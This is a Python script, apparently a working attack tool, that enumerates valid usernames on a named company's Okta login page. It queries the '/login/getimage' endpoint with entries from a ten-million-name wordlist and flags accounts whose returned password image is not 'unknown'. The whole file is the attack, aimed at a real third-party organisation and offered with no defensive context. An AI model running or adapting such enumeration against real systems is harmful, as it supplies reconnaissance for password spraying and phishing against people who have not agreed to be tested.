import requests
import json
import time

ip = "macpaw.okta.com"
#port = "8080"
api = "/login/getimage?username="
#ip = "localhost"
#port = "5000"
#api = "/testapi"


w = "/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt"

def readfile():
    f = open(w, "r")
    for word in f:
        get(word)

def get(user):
    try:
        while True:
            print("Testing " + user)
            time.sleep(2)
            url = "http://" + ip + api + user
            response = requests.get(url)
            #print(response.status_code) 
            #print(response.text)
            if response.status_code == 200:
                r = json.loads(response.text)
                if r["pwdImg"].find("unknown") == -1:
                    print("User found: " + r["pwdImg"])
            break
    except Exception:
        print("Error")
        raise Exception()


        
